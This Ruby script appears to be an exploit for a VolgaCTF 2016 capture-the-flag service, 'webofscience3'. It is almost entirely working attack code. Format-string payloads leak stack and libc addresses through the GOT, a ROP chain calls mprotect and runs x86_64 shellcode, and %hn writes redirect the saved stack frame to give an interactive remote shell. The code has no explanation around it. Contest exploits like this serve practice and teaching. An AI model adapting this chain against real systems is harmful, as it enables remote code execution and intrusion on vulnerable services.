#!/usr/bin/ruby
require '~/Tools/pwnlib'

local = false#true

if local == true
	host, port = '127.0.0.1',4445
	libc_start_main_offset = 0x21a50
	system_offset = 0x414f0
	mprotect_offset = 0xe21a0
else
	host, port = 'webofscience3.2016.volgactf.ru',45680
	libc_start_main_offset = 0x00021dd0
	system_offset = 0x00046640
	mprotect_offset = 0x000f4a20
end

def _exit(r)
	r.sendline("5")
end

def add_paper(r,name=nil,author=nil,abstract=nil,tag=nil,view=false)
	r.recv_until(">")
	r.sendline("1")
	
	add_paper_name(r,name)# if name != nil
	add_paper_authors(r,author) if author != nil
	add_paper_abstract(r,abstract) if abstract != nil
	add_paper_tag(r,tag) if tag != nil
	leak = view(r) if view != false
	quit_add(r)
	return leak[0] if view != false
end
def view(r)
	r.recv_until(">")
	r.sendline("8")
	r.recv_until("Abstract:\n	")
	leak = r.recv_capture(/(.*)\n/)
	r.recv_until("Add paper menu")
	return leak
end
def add_paper_tag(r,tag)
	r.recv_until(">")
        r.sendline("4")
        r.recv_until("Paper tags:")
        r.sendline(tag)
end
def add_paper_abstract(r,abstract)
	r.recv_until(">")
        r.sendline("3")
        r.recv_until("Paper abstract:")
        r.sendline(abstract)
end
def add_paper_authors(r,author)
	r.recv_until(">")
        r.sendline("2")
        r.recv_until("Paper authors:")
        r.sendline(author)
end
def add_paper_name(r,name)
	r.recv_until(">")
	r.sendline("1")
	r.recv_until("Paper name:")
	r.sendline(name)
end
def quit_add(r)
	r.recv_until(">")
        r.sendline("9")
end
def p64(*address)
	return address.pack("Q*")
end
PwnTube.open(host, port) do |r|
	got_libc_start_main = 0x603040
	pop3_ret = 0x00000000004019ef
	pop_rdi = 0x00000000004019f3
	leave_ret = 0x0000000000400fb4
	pop_rbp = 0x0000000000400a55 

	r.recv_until("x[:24]==")
	sha = r.recv(24)
	ans = `python a.py #{sha}`
	print ans
	r.send(ans)
	
	# first add paper name is in 0x603100
	leak_rbp = add_paper(r,name="/bin/sh",author=nil,abstract="%10$p",tag=nil,view=true).to_i(16)
	
	#second heap in 0x603300
	leak = "%18$s"
	payload = p64(got_libc_start_main)
	leak = add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)
	libc_start_main = leak.ljust(8,"\0").unpack("Q")[0]
	
	base = libc_start_main - libc_start_main_offset
	system = base + system_offset
	mprotect = base + mprotect_offset
	
	puts "[!] rbp : 0x"+leak_rbp.to_s(16)
	puts "[!] base : 0x" + base.to_s(16)
	puts "[!] system : 0x" + system.to_s(16)
	puts "[!] mprotect : 0x" + mprotect.to_s(16)
	
	#three heap in 0x603bd0
	payload = p64(mprotect)
	payload << p64(0x4019ea)
	payload << p64(0,0x603c10,0x603bd0,0x7,0x5000,0x603000)
	payload << p64(0x4019d0)
	payload << p64(0x7a7a7a7a,1,2,3,4,0x603c48)
	payload << PwnLib.shellcode_x86_64
	add_paper(r,name=payload,author=nil,abstract="",tag=nil,view=false)
	
	leak = "%64c%18$hn%2581c%19$hn"
	payload = p64(leak_rbp+8*5+2,leak_rbp+8*5)
	add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
	puts "[!] set pop_rbp OK!"
	leak = "%96c%18$hn%15216c%19$hn"
	payload = p64(leak_rbp+8*6+2,leak_rbp+8*6)
	add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
	puts "[!] set rbp OK!"
	leak = "%64c%18$hn%3956c%19$hn"
	payload = p64(leak_rbp+8*7+2,leak_rbp+8*7)	
	add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
	puts "[!] set leave_ret OK!"
	leak = "%64c%18$hn%6575c%19$hn"#or 6574
	payload = p64(leak_rbp+8*1+2,leak_rbp+8)
	add_paper(r,name=payload,author=nil,abstract=leak,tag=nil,view=true)	
	_exit(r)
	r.interactive()
end
